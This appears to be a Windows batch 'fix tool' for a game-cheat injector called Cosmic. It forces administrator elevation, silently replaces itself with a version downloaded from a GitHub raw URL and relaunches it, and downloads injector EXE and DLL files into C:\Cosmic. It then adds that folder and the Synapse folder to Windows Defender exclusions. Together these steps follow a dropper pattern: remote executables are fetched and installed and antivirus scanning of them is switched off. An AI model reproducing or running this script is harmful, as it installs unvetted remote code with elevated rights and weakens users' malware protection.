@echo off
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [!] Administrator permission required. Please approve...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

title Cosmic Fix Tool
color 0B

set "cosmicPath=C:\Cosmic"
set "CURRENT_VER=1.0.4"
set "SELF=%~f0"
set "RAW_VER=https://raw.githubusercontent.com/FixCosmicBat/FixCosmicBat/refs/heads/main/version.txt"
set "RAW_BAT=https://raw.githubusercontent.com/FixCosmicBat/FixCosmicBat/refs/heads/main/FixCosmic.bat"

if "%1"=="/updated" goto menu

:check_update
echo [*] Checking for updates...

powershell -NoProfile -NonInteractive -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "$v=(Invoke-WebRequest '%RAW_VER%' -UseBasicParsing -TimeoutSec 5).Content.Trim();" ^
  "if($v -and $v -ne '%CURRENT_VER%'){" ^
  "  Invoke-WebRequest '%RAW_BAT%' -OutFile '%SELF%.new' -UseBasicParsing -TimeoutSec 15;" ^
  "  Write-Host $v" ^
  "} else { Write-Host $v }" ^
  > "%temp%\cosmic_ver.txt" 2>nul

set "LATEST_VER="
set /p LATEST_VER=<"%temp%\cosmic_ver.txt"
del "%temp%\cosmic_ver.txt" >nul 2>&1

if "%LATEST_VER%"=="" (
    echo [!] Could not check for updates. Continuing...
    goto menu
)

if "%CURRENT_VER%"=="%LATEST_VER%" (
    echo [+] Already up to date ^(v%CURRENT_VER%^).
    goto menu
)

if not exist "%SELF%.new" (
    echo [!] Update download failed. Continuing...
    goto menu
)

for %%F in ("%SELF%.new") do if %%~zF==0 (
    del "%SELF%.new" >nul 2>&1
    echo [!] Downloaded file is empty. Continuing...
    goto menu
)

echo [+] Updated to v%LATEST_VER%! Restarting...
echo move /y "%SELF%.new" "%SELF%" > "%temp%\cosmic_update.bat"
echo start "" "%SELF%" /updated >> "%temp%\cosmic_update.bat"
echo del "%temp%\cosmic_update.bat" >> "%temp%\cosmic_update.bat"
start "" cmd /c "timeout /t 2 >nul & "%temp%\cosmic_update.bat""
exit

:menu
cls
echo ==============================
echo      COSMIC FIX TOOL v%CURRENT_VER%
echo   Made by Syno317 / BlackStageX
echo ==============================
echo.
echo [1] Fix Injector / Module Error
echo [2] Fix Login Error
echo [3] Fix Antivirus Exclusion
echo [4] Exit
echo.
set /p choice=Select option: 

if "%choice%"=="1" goto fix_injector
if "%choice%"=="2" goto fix_login
if "%choice%"=="3" goto fix_exclusion
if "%choice%"=="4" exit

goto menu

:kill_synapse
tasklist /FI "IMAGENAME eq Synapse Launcher.exe" | find /I "Synapse Launcher.exe" >nul
if errorlevel 1 (
    echo [*] Synapse is not running.
) else (
    echo [*] Killing Synapse...
    taskkill /f /im "Synapse Launcher.exe" /t >nul 2>&1
    taskkill /f /im Synapse.exe /t >nul 2>&1
    taskkill /f /im SynapseInjector.exe /t >nul 2>&1
    wmic process where "name like '%%Synapse%%'" delete >nul 2>&1
    timeout /t 2 >nul
)
goto :eof

:launch_synapse
echo [*] Searching for Synapse Launcher.exe on all drives...
set "found="

for %%X in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%X:\" (
        for /r "%%X:\" %%F in ("Synapse Launcher.exe") do (
            if not defined found (
                set "found=%%~fF"
            )
        )
    )
)

if not defined found (
    echo [!] Synapse Launcher.exe not found on any drive!
    goto :eof
)

goto :found_synapse

:found_synapse
echo [+] Found: %found%
tasklist /FI "IMAGENAME eq Synapse Launcher.exe" | find /I "Synapse Launcher.exe" >nul
if errorlevel 1 (
    echo [*] Launching Synapse...
    start "" "%found%"
    timeout /t 3 >nul
) else (
    echo [*] Synapse is already running.
)
goto :eof

:fix_injector
cls
echo ==============================
echo      COSMIC FIX TOOL v%CURRENT_VER%
echo   Made by Syno317 / BlackStageX
echo ==============================
echo.
call :kill_synapse

echo [*] Cleaning old files...
attrib -r -s -h "%cosmicPath%\Cosmic-Injector.exe" 2>nul
attrib -r -s -h "%cosmicPath%\Cosmic-Module.dll" 2>nul
del /f /q "%cosmicPath%\Cosmic-Injector.exe" >nul 2>&1
del /f /q "%cosmicPath%\Cosmic-Module.dll" >nul 2>&1

echo [*] Downloading fix files...
powershell -NoProfile -Command "Invoke-WebRequest 'https://github.com/FixCosmicBat/FixCosmicBat/releases/download/injector_fix.zip/injector_fix.zip' -OutFile '%temp%\injector_fix.zip'"

echo [*] Extracting...
powershell -NoProfile -Command "Expand-Archive -Path '%temp%\injector_fix.zip' -DestinationPath '%temp%\cosmic_fix' -Force"

echo [*] Replacing files...
copy /y "%temp%\cosmic_fix\Cosmic-Injector.exe" "%cosmicPath%\" >nul
copy /y "%temp%\cosmic_fix\Cosmic-Module.dll" "%cosmicPath%\" >nul

echo.
echo [+] The issue is fixed, enjoy!
echo.
echo   Made by Syno317 / BlackStageX
echo.
pause
goto menu

:fix_login
cls
echo ==============================
echo      COSMIC FIX TOOL v%CURRENT_VER%
echo   Made by Syno317 / BlackStageX
echo ==============================
echo.
call :kill_synapse

echo [*] Removing credentials...
attrib -r -s -h "%cosmicPath%\Credentials.dat" 2>nul
del /f /q "%cosmicPath%\Credentials.dat" >nul 2>&1

echo.
echo [+] The issue is fixed, enjoy!
echo.
echo   Made by Syno317 / BlackStageX
echo.
pause
goto menu

:fix_exclusion
cls
echo ==============================
echo      COSMIC FIX TOOL v%CURRENT_VER%
echo   Made by Syno317 / BlackStageX
echo ==============================
echo.
echo [*] Adding C:\Cosmic to Windows Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%cosmicPath%'"

echo [*] Searching for Synapse Launcher.exe on all drives...
set "synapsefolder="

for %%X in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%X:\" (
        for /r "%%X:\" %%F in ("Synapse Launcher.exe") do (
            if not defined synapsefolder (
                set "synapsefolder=%%~dpF"
            )
        )
    )
)

if not defined synapsefolder (
    echo [!] Synapse Launcher.exe not found, skipping...
    goto :exclusion_done
)

echo [*] Found Synapse at: %synapsefolder%
echo [*] Adding Synapse folder to Windows Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%synapsefolder%'"

:exclusion_done
echo.
echo [+] The issue is fixed, enjoy!
echo.
echo   Made by Syno317 / BlackStageX
echo.
pause
goto menu
